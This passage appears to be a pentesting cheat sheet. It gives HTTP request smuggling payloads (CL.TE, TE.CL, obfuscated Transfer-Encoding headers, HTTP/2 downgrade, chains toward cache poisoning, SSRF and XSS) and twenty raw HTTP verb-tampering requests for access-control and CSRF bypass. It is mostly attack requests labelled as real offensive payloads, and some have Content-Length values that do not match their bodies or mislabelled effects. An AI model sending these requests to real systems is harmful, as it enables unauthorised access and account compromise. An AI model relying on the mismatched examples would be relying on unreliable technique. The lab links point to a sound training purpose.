`www.example.com` now incorrectly processes the `HEAD` request in the `POST`'s body, instead of the browser's `GET` request, and returns 404 not found with a content-length, before replying to the next misinterpreted third (`GET /x?x=<script>...`) request and finally the browser's actual `GET` request.
Since the browser only sent one request, it accepts the response to the `HEAD` request as the response to its `GET` request and interprets the third and fourth responses as the body of the response, and thus executes the attacker's script.

## Labs

* [PortSwigger - HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
* [PortSwigger - HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
* [PortSwigger - HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header)
* [PortSwigger - Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
* [PortSwigger - Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)

# **1. List of Vulnerabilities**

```
1.1 CL.TE (Content-Length vs Transfer-Encoding mismatch)
1.2 TE.CL (Transfer-Encoding vs Content-Length mismatch)
1.3 TE.TE (Dual Transfer-Encoding header collision)
1.4 Obfuscated Transfer-Encoding header bypass
1.5 H/2 to H/1 downgrading smuggling
1.6 HTTP/1.1 pipeline desync attacks
1.7 HTTP/2 request queue poisoning
1.8 Smuggling via folded headers (obsolete line folding)
1.9 Reverse proxy parsing inconsistencies (Nginx, HAProxy, Apache)
1.10 Response queue poisoning → Cache poisoning → Credential theft
```

---

# **2. Sample Payloads (Core Attack Payloads)**

*(Basic learning/test payloads — safe)*

```
2.1 CL.TE Basic Smuggle
POST / HTTP/1.1
Host: victim.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: victim.com
```

```
2.2 TE.CL Basic Smuggle
POST / HTTP/1.1
Host: victim.com
Transfer-Encoding: chunked
Content-Length: 4

1
Z
0

GET /pwned HTTP/1.1
Host: victim.com
```

```
2.3 Obfuscated TE Header
POST / HTTP/1.1
Host: victim.com
Transfer-Encoding : chunked
Content-Length: 6

0

X
```

```
2.4 Smuggling With Upper/Lower Case
Transfer-encoding: chunked
```

```
2.5 CL Overread Attempt
Content-Length: 100
<10-byte-body>
```

---

# **3. Sample Payloads (Updated With Real Payloads for Learning)**

*(Real offensive request smuggling payloads used in actual attacks)*

```
3.1 CL.TE Attack – Insert New Request
POST / HTTP/1.1
Host: victim
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: victim
```

```
3.2 TE.CL Attack – Admin Panel Access
POST /login HTTP/1.1
Host: victim
Transfer-Encoding: chunked
Content-Length: 5

1
A
0

GET /admin/dashboard HTTP/1.1
Host: victim
```

```
3.3 TE.TE Dual Header Collision
Transfer-Encoding: chunked
Transfer-Encoding: identity
```

```
3.4 H2 → H1 Downgrade Smuggling
:method: POST
:scheme: https
:authority: victim.com
transfer-encoding: chunked

0

GET /private
```

```
3.5 Reverse Proxy Poisoning (Nginx → Apache)
POST / HTTP/1.1
Host: victim
Content-Length: 4
Transfer-Encoding: chunked

0

GET /secret HTTP/1.1
Host: victim
```

```
3.6 Cache Poisoning Smuggle
POST /cacheable HTTP/1.1
Host: victim
Content-Length: 16
Transfer-Encoding: chunked

0

GET /profile?user=admin HTTP/1.1
Host: victim
```

```
3.7 Header Injection via Smuggle
POST / HTTP/1.1
Host: victim
Content-Length: 33
Transfer-Encoding: chunked

0

GET / HTTP/1.1
X-Admin: true
```

```
3.8 Credential Theft (forward poisoning)
POST / HTTP/1.1
Host: victim
Content-Length: 10
Transfer-Encoding: chunked

0

GET /cookies HTTP/1.1
Host: victim
```

```
3.9 WAF Bypass → Hidden Admin
POST / HTTP/1.1
Transfer-Encoding: chunked
Transfer-Encoding: identity
```

```
3.10 Chained Smuggle → Backend Command Trigger
0

POST /trigger?cmd=restart HTTP/1.1
Host: victim
```

---

# **4. Bypass Techniques (Filter Bypass, Header Obfuscation, WAF Evasion)**

```
4.1 TE Header Obfuscation
Transfer-Encoding: chunked
Transfer-Encoding: identity
```

```
4.2 Whitespaces Bypass
Transfer-Encoding : chunked
```

```
4.3 Tab Injection
Transfer-Encoding:\tchunked
```

```
4.4 Mixed Case Bypass
TrAnSfEr-EnCoDiNg: chunked
```

```
4.5 Duplicate Headers Bypass
Transfer-Encoding: chunked
Transfer-Encoding: cow
```

```
4.6 Chunked Body Obfuscation
1;ext=1
A
0
```

```
4.7 Line Folding (Obsolete RFC)
Transfer-Encoding:
 chunked
```

```
4.8 Encoded TE Header
Transfer-Encoding:%20chunked
```

```
4.9 Injecting Null Bytes
Transfer-Encoding: chunked%00
```

```
4.10 Multi-Proxy Parsing Confusion
Content-Length: 999
Transfer-Encoding: chunked
```

---

# **5. Advanced Attack Chains (Real-World Exploitation)**

```
5.1 Smuggling → Cache Poisoning → Credential Hijack
Smuggle a malicious GET request that is stored in cache.
```

```
5.2 Smuggling → Internal Admin Endpoint Exposure
Inject:
GET /internal/admin HTTP/1.1
Host: victim
```

```
5.3 Smuggling → Web Application Firewall Bypass
Use obfuscated TE header + chunked body trick.
```

```
5.4 Smuggling → Session Fixation
Force backend to process attacker-controlled Set-Cookie.
```

```
5.5 Smuggling → JWT Kid Injection via Queued Request
Queue request modifying "kid" header used by backend.
```

```
5.6 Smuggling → SSRF via Backend Follow-Up Request
Inject:
GET http://127.0.0.1:8080/admin
```

```
5.7 Smuggling → Stored XSS Through Cache Poisoning
Inject malicious JavaScript into cacheable responses.
```

# ✅ **HTTP Verb Testcase Names (Names Only)**

1. GET Method Access Control Test
2. POST Method Access Control Test
3. PUT Method Access Control Test
4. DELETE Method Access Control Test
5. PATCH Method Access Control Test
6. HEAD Method Access Control Test
7. OPTIONS Method Exposure Test
8. TRACE Method Enabled Test
9. TRACK Method Enabled Test
10. CONNECT Method Enabled Test
11. X-HTTP-Method Override Test
12. X-HTTP-Method-Override Header Test
13. Method Spoofing via Query Parameter
14. Method Spoofing via Hidden Form Field
15. HTTP Verb Fuzzing (Custom Methods)
16. Privilege Escalation via Unsupported Methods
17. CORS Preflight Method Validation
18. Rate Limiting Test Per HTTP Verb
19. CSRF Validation per HTTP Verb
20. API Endpoint Method Fuzzing

---

### **1. GET Method Access Control Test**

**Real Payload:**

```
GET /api/v1/users/1245/profile HTTP/1.1
Host: target.com
Authorization: Bearer guest-token-123
```

---

### **2. POST Method Access Control Test**

**Real Payload:**

```
POST /api/v1/orders HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer guest-token-123

{
  "product_id": 8891,
  "quantity": 2,
  "address": "Bangalore, India"
}
```

---

### **3. PUT Method Access Control Test**

**Real Payload:**

```
PUT /api/v1/users/1245 HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer user-token-123

{
  "email": "updated_email@test.com",
  "mobile": "+918885556666"
}
```

---

### **4. DELETE Method Access Control Test**

**Real Payload:**

```
DELETE /api/v1/users/1245 HTTP/1.1
Host: target.com
Authorization: Bearer guest-token-123
```

*(Checks if low-privilege token can delete accounts.)*

---

### **5. PATCH Method Access Control Test**

**Real Payload:**

```
PATCH /api/v1/users/1245 HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer user-token-123

{
  "role": "admin"
}
```

*(Privilege-escalation scenario.)*

---

### **6. HEAD Method Access Control Test**

**Real Payload:**

```
HEAD /api/v1/invoices/9958 HTTP/1.1
Host: target.com
Authorization: Bearer guest-token-123
```

---

### **7. OPTIONS Method Exposure Test**

**Real Payload:**

```
OPTIONS /api/v1/users HTTP/1.1
Host: target.com
Origin: https://example.com
```

---

### **8. TRACE Method Enabled Test**

**Real Payload:**

```
TRACE /api/v1/auth/login HTTP/1.1
Host: target.com
```

---

### **9. TRACK Method Enabled Test**

**Real Payload:**

```
TRACK /api/v1/payments HTTP/1.1
Host: target.com
```

---

### **10. CONNECT Method Enabled Test**

**Real Payload:**

```
CONNECT internal.target.com:443 HTTP/1.1
Host: internal.target.com
```

---

### **11. Method Override Test (X-HTTP-Method)**

**Real Payload:**

```
POST /api/v1/users/9401 HTTP/1.1
Host: target.com
X-HTTP-Method: DELETE
Authorization: Bearer guest-token-123
```

---

### **12. X-HTTP-Method-Override Test**

**Real Payload:**

```
POST /api/v1/users/9401 HTTP/1.1
Host: target.com
X-HTTP-Method-Override: PUT
Content-Type: application/json
Authorization: Bearer guest-token-123

{
  "account_status": "disabled"
}
```

---

### **13. Method Spoofing via Query Param**

**Real Payload:**

```
POST /api/v1/users/9401?_method=DELETE HTTP/1.1
Host: target.com
Authorization: Bearer guest-token-123
```

---

### **14. Method Spoofing via Hidden Field**

**Real Payload:**

```
POST /api/v1/users/update HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer user-token-123

_method=PATCH&email=hacker@test.com
```

---

### **15. Custom Verb Fuzzing via Burp Repeater**

**Real Payload:**

```
MOVE /api/v1/admin/settings HTTP/1.1
Host: target.com
Authorization: Bearer guest-token-123
```

---

### **16. Privilege Escalation via Unsupported HTTP Methods**

**Real Payload:**

```
PROPFIND /api/v1/admin/users HTTP/1.1
Host: target.com
Authorization: Bearer guest-token-123
```

---

### **17. CORS Preflight With Dangerous Verb**

**Real Payload:**

```
OPTIONS /api/v1/password/reset HTTP/1.1
Host: target.com
Origin: https://attacker.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Authorization
```

---

### **18. Rate Limiting Per Verb Test**

**Real Payload (repeat 50–100 times):**

```
PUT /api/v1/auth/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"admin","password":"wrongpass"}
```

---

### **19. CSRF Check for PUT/PATCH/DELETE**

**Real Payload:**

```
PUT /api/v1/user/settings HTTP/1.1
Host: target.com
Content-Type: application/json

{"two_factor_enabled": false}
```

*(Sent without CSRF token.)*

---

### **20. API Verb Fuzzing (Unsupported Verbs Test)**

**Real Payload:**

```
UNLOCK /api/v1/admin/panel HTTP/1.1
Host: target.com
Authorization: Bearer guest-token-123
```

---
